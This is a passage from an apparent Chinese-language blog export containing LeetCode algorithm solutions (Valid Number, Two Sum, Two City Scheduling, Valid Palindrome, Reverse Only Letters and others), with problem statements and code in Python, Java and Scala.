&#123;</span><br><span class="line">            left ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> indice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/two-sum-ii-input-array-is-sorted/discuss/?currentPage=1&amp;orderBy=recent_activity&amp;query=" target="_blank" rel="noopener">two-sum-ii-input-array-is-sorted</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>56.Valid Number</title>
    <url>/2019/05/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Valid%20Number/</url>
    <content><![CDATA[<p>Validate if a given string can be interpreted as a decimal number.</p>
<p>Some examples:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;0&quot; =&gt; true</span><br><span class="line">&quot; 0.1 &quot; =&gt; true</span><br><span class="line">&quot;abc&quot; =&gt; false</span><br><span class="line">&quot;1 a&quot; =&gt; false</span><br><span class="line">&quot;2e10&quot; =&gt; true</span><br><span class="line">&quot; -90e3   &quot; =&gt; true</span><br><span class="line">&quot; 1e&quot; =&gt; false</span><br><span class="line">&quot;e3&quot; =&gt; false</span><br><span class="line">&quot; 6e-1&quot; =&gt; true</span><br><span class="line">&quot; 99e2.5 &quot; =&gt; false</span><br><span class="line">&quot;53.5e93&quot; =&gt; true</span><br><span class="line">&quot; --6 &quot; =&gt; false</span><br><span class="line">&quot;-+3&quot; =&gt; false</span><br><span class="line">&quot;95a54e53&quot; =&gt; false</span><br></pre></td></tr></table></figure></p>
<p>Note: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one. However, here is a list of characters that can be in a valid decimal number:</p>
<p>Numbers 0-9<br>Exponent - “e”<br>Positive/negative sign - “+”/“-“<br>Decimal point - “.”<br>Of course, the context of these characters also matters in the input.</p>
<p>Update (2015-02-10):<br>The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button to reset your code definition.</p>
<a id="more"></a>
<h1 id="题意解读"><a href="#题意解读" class="headerlink" title="题意解读"></a>题意解读</h1><p>验证字符串是小数,注意数字0-9、e、+、-、. 主要就是这几个符号的判断。主要是各种情况的考虑,比较繁琐。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>Python</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isNumber</span><span class="params">(self, s: str)</span> -&gt; bool:</span></span><br><span class="line">        s = s.strip(<span class="string">' '</span>)</span><br><span class="line">        size = len(s)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        number = [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</span><br><span class="line">        chars = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'.'</span>, <span class="string">'e'</span>]</span><br><span class="line">        <span class="comment"># 只有一个字符判断是否为数字</span></span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">in</span> number</span><br><span class="line">        <span class="comment"># 最后一个字符必须为数字或.</span></span><br><span class="line">        <span class="keyword">if</span> s[size<span class="number">-1</span>] <span class="keyword">not</span> <span class="keyword">in</span> number <span class="keyword">and</span> s[size<span class="number">-1</span>] != <span class="string">'.'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 第一个字符不能为e</span></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">'e'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        existChar = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            cur = s[i]</span><br><span class="line">            <span class="comment">#print(cur, existChar)</span></span><br><span class="line">            <span class="comment"># 字符不能出现多次</span></span><br><span class="line">            <span class="keyword">if</span> cur <span class="keyword">in</span> existChar:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 只能数字和指定字符</span></span><br><span class="line">            <span class="keyword">if</span> cur <span class="keyword">not</span> <span class="keyword">in</span> number <span class="keyword">and</span> cur <span class="keyword">not</span> <span class="keyword">in</span> chars:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> cur <span class="keyword">in</span> chars <span class="keyword">and</span> i &lt; size<span class="number">-1</span>:</span><br><span class="line">                nextChar = s[i+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span>  s[<span class="number">0</span>] != <span class="string">'+'</span> <span class="keyword">and</span> s[<span class="number">0</span>] != <span class="string">'-'</span>:</span><br><span class="line">                    existChar.append(cur)</span><br><span class="line">                <span class="keyword">if</span> cur != <span class="string">'e'</span> <span class="keyword">and</span> nextChar <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">if</span> cur == <span class="string">'.'</span> <span class="keyword">and</span> nextChar != <span class="string">'e'</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">and</span> cur == <span class="string">'.'</span> <span class="keyword">and</span> nextChar == <span class="string">'e'</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> cur != <span class="string">'.'</span> <span class="keyword">and</span> nextChar == <span class="string">'e'</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> cur == <span class="string">'e'</span>:</span><br><span class="line">                    <span class="keyword">if</span> nextChar != <span class="string">'+'</span> <span class="keyword">and</span> nextChar != <span class="string">'-'</span> <span class="keyword">and</span> nextChar <span class="keyword">not</span> <span class="keyword">in</span> number:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="comment"># +,- 不能出现在字符串中间,但是e后边可以是+,-</span></span><br><span class="line">                <span class="keyword">if</span> cur == <span class="string">'+'</span> <span class="keyword">or</span> cur == <span class="string">"-"</span>:</span><br><span class="line">                    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> s[i<span class="number">-1</span>] != <span class="string">'e'</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 判断e后字符是否合法</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'e'</span> <span class="keyword">in</span> s:</span><br><span class="line">            estr = s.split(<span class="string">"e"</span>)</span><br><span class="line">            etr = estr[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(etr)):</span><br><span class="line">                er = etr[j]</span><br><span class="line">               <span class="comment"># print(er)</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="number">0</span> <span class="keyword">and</span> er <span class="keyword">not</span> <span class="keyword">in</span> number <span class="keyword">and</span> er != <span class="string">'+'</span> <span class="keyword">and</span> er != <span class="string">'-'</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> j != <span class="number">0</span> <span class="keyword">and</span> er <span class="keyword">not</span> <span class="keyword">in</span> number:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 如果字符串是否含任何数字</span></span><br><span class="line">        res = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            <span class="keyword">if</span> s[i] <span class="keyword">in</span> number:</span><br><span class="line">                res = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案:</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNumber</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    s = s.trim();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">boolean</span> pointSeen = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> eSeen = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> numberSeen = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> numberAfterE = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;s.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'0'</span> &lt;= s.charAt(i) &amp;&amp; s.charAt(i) &lt;= <span class="string">'9'</span>) &#123;</span><br><span class="line">            numberSeen = <span class="keyword">true</span>;</span><br><span class="line">            numberAfterE = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(s.charAt(i) == <span class="string">'.'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(eSeen || pointSeen) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pointSeen = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(s.charAt(i) == <span class="string">'e'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(eSeen || !numberSeen) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            numberAfterE = <span class="keyword">false</span>;</span><br><span class="line">            eSeen = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(s.charAt(i) == <span class="string">'-'</span> || s.charAt(i) == <span class="string">'+'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span> &amp;&amp; s.charAt(i-<span class="number">1</span>) != <span class="string">'e'</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> numberSeen &amp;&amp; numberAfterE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://leetcode.com/problems/valid-number/discuss?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">65. Valid Number</a></p>
</li>
<li><p><a href="https://leetcode.wang/leetCode-65-Valid-Number.html" target="_blank" rel="noopener">leetCode-65-Valid-Number</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1. Two Sum</title>
    <url>/2020/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Two%20Sum/</url>
    <content><![CDATA[<p>Given an array of integers, return indices of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have exactly one solution, and you may not use the same element twice.</p>
<ul>
<li>Example</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Given nums = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>], target = <span class="number">9</span>,</span><br><span class="line"></span><br><span class="line">Because nums[<span class="number">0</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span>,</span><br><span class="line"><span class="keyword">return</span> [<span class="number">0</span>, <span class="number">1</span>].</span><br></pre></td></tr></table></figure>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h2><p>暴力枚举是循环找出所有元素中符合条件的元素。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 暴力枚举.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> target</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">var</span> length = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; length; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i, j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="字典暂存实现"><a href="#字典暂存实现" class="headerlink" title="字典暂存实现"></a>字典暂存实现</h2><p>利用字典将目标值保存，最后从字典中取值即可。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSumByDict(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> map = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (map.containsKey(target - nums[i])) &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = i;</span><br><span class="line">        arr[<span class="number">1</span>] = map.get(target - nums[i]);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">      &#125;</span><br><span class="line">      map.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="双指针实现"><a href="#双指针实现" class="headerlink" title="双指针实现"></a>双指针实现</h2><p>双指针需要先排序数组,指针来指向首尾元素,根据首尾元素之和与目标和的大小关系来移动指针。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 双指针实现.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> target</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSumByDoublePointer(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">var</span> newNums = Arrays.copyOf(nums, nums.length);</span><br><span class="line">    Arrays.sort(newNums);</span><br><span class="line">    <span class="keyword">var</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> right = newNums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">      <span class="keyword">var</span> sum = newNums[left] + newNums[right];</span><br><span class="line">      <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;left, right&#125;;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">        right--;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (sum &lt; target) &#123;</span><br><span class="line">        left++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">      list.add(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;list.indexOf(newNums[result[<span class="number">0</span>]]),</span><br><span class="line">        list.lastIndexOf(newNums[result[<span class="number">1</span>]])&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://leetcode.com/problems/two-sum/" target="_blank" rel="noopener">Two Sum</a></li>
</ul>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1029. Two City Scheduling</title>
    <url>/2019/05/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Two%20City%20Scheduling/</url>
    <content><![CDATA[<p>There are 2N people a company is planning to interview. The cost of flying the i-th person to city A is costs[i][0], and the cost of flying the i-th person to city B is costs[i][1].</p>
<p>Return the minimum cost to fly every person to a city such that exactly N people arrive in each city.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[10,20],[30,200],[400,50],[30,20]]</span><br><span class="line">Output: 110</span><br><span class="line">Explanation:</span><br><span class="line">The first person goes to city A for a cost of 10.</span><br><span class="line">The second person goes to city A for a cost of 30.</span><br><span class="line">The third person goes to city B for a cost of 50.</span><br><span class="line">The fourth person goes to city B for a cost of 20.</span><br><span class="line"></span><br><span class="line">The total minimum cost is 10 + 30 + 50 + 20 = 110 to have half the people interviewing in each city.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Note:</li>
</ul>
</blockquote>
<ol>
<li>1 &lt;= costs.length &lt;= 100</li>
<li>It is guaranteed that costs.length is even.</li>
<li>1 &lt;= costs[i][0], costs[i][1] &lt;= 1000</li>
</ol>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>公司计划采访的人数为 2N。 将第 i 个人飞往城市 A 的费用是[i][0]，将第 i 个人飞到城市 B 的费用是费用[i][1]。</p>
<p>求将每个人带到一个城市的最低费用并且每个城市就有 N 个人到达。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>DP</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">twoCitySchedCost</span><span class="params">(<span class="keyword">int</span>[][] costs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N = costs.length / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[N + <span class="number">1</span>][N + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++) &#123;</span><br><span class="line">      dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + costs[i - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= N; j++) &#123;</span><br><span class="line">      dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j - <span class="number">1</span>] + costs[j - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= N; j++) &#123;</span><br><span class="line">        dp[i][j] = Math.min(dp[i - <span class="number">1</span>][j] + costs[i + j - <span class="number">1</span>][<span class="number">0</span>], dp[i][j - <span class="number">1</span>] + costs[i + j - <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][N];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/two-city-scheduling/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">two-city-scheduling</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>leetcode</tag>
        <tag>greedy</tag>
      </tags>
  </entry>
  <entry>
    <title>125. Valid Palindrome</title>
    <url>/2018/06/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Valid%20Palindrome/</url>
    <content><![CDATA[<p>Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.<br>Note: For the purpose of this problem, we define empty string as valid palindrome.<br>Example 1:<br>Input: “A man, a plan, a canal: Panama”<br>Output: true<br>Example 2:<br>Input: “race a car”<br>Output: false</p>
<blockquote>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1></blockquote>
<p>判断字符串是否是回文,题目要点是仅考虑字母数字字符且忽略大小写.</p>
<blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul>
<li>scala 实现</li>
</ul>
</blockquote>
<p>scala 正则替换非字母数字字符串</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span></span>(s: <span class="type">String</span>): <span class="type">Boolean</span> = &#123;</span><br><span class="line">    <span class="keyword">if</span> (s==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">val</span> str = s.replaceAll(<span class="string">"[^0-9a-zA-Z]"</span>,<span class="string">""</span>)</span><br><span class="line">    str.equalsIgnoreCase(str.reverse)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode.com/problems/valid-palindrome/description/" target="_blank" rel="noopener">Valid Palindrome</a></li>
</ul>
</blockquote>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>917.仅仅反转字母</title>
    <url>/2022/02/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/reverseOnlyLetters/</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>给你一个字符串 s ，根据下述规则反转字符串：</p>
<blockquote>
<ul>
<li>所有非英文字母保留在原有位置。</li>
<li>所有英文字母（小写或大写）位置反转。</li>
</ul>
</blockquote>
<p>返回反转后的 s 。</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;ab-cd&quot;</span><br><span class="line">输出：&quot;dc-ba&quot;</span><br></pre></td></tr></table></figure>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2"></a>示例 2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;a-bC-dEf-ghIj&quot;</span><br><span class="line">输出：&quot;j-Ih-gfE-dCba&quot;</span><br></pre></td></tr></table></figure>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例 3"></a>示例 3</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;Test1ng-Leet=code-Q!&quot;</span><br><span class="line">输出：&quot;Qedo1ct-eeLg=ntse-T!&quot;</span><br></pre></td></tr></table></figure>
<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><blockquote>
<ul>
<li>1 &lt;= s.length &lt;= 100</li>
<li>s 仅由 ASCII 值在范围 [33, 122] 的字符组成</li>
<li>s 不含 ‘\”‘ 或 ‘\‘</li>
</ul>
</blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>双指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseOnlyLetters</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.length();</span><br><span class="line">		<span class="keyword">char</span>[] array = s.toCharArray();</span><br><span class="line">		<span class="keyword">int</span> left = <span class="number">0</span>, right = len - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">			<span class="keyword">if</span> (Character.isLetter(array[left]) &amp;&amp; Character.isLetter(array[right]))&#123;</span><br><span class="line">				<span class="keyword">char</span> tmp = array[left];</span><br><span class="line">				array[left] = array[right];</span><br><span class="line">				array[right] = tmp;</span><br><span class="line">				left ++;</span><br><span class="line">				right--;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span> (!Character.isLetter(array[left]))&#123;</span><br><span class="line">				left ++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Character.isLetter(array[right]))&#123;</span><br><span class="line">				right --;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> String(array);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode-cn.com/problems/reverse-only-letters/" target="_blank" rel="noopener">917.仅仅反转字母</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指 Offer 57. 和为s的两个数字</title>
    <url>/2021/04/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/offer/TwoSum/</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入一个递增排序的数组和一个数字s，在数组中查找两个数，使得它们的和正好是s。如果有多对数字的和等于s，则输出任意一对即可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line">输入：nums = [2,7,11,15], target = 9</span><br><span class="line">输出：[2,7] 或者 [7,2]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：nums = [10,26,30,31,47,60], target = 40</span><br><span class="line">输出：[10,30] 或者 [30,10]</span><br><span class="line"></span><br><span class="line">限制：</span><br><span class="line">1 &lt;= nums.length &lt;= 10^5</span><br><span class="line">1 &lt;= nums[i] &lt;= 10^6</span><br></pre></td></tr></table></figure>
<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><p>这种有序数组的查找比较经典的用法是双指针。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>时间复杂度O(n)</p>
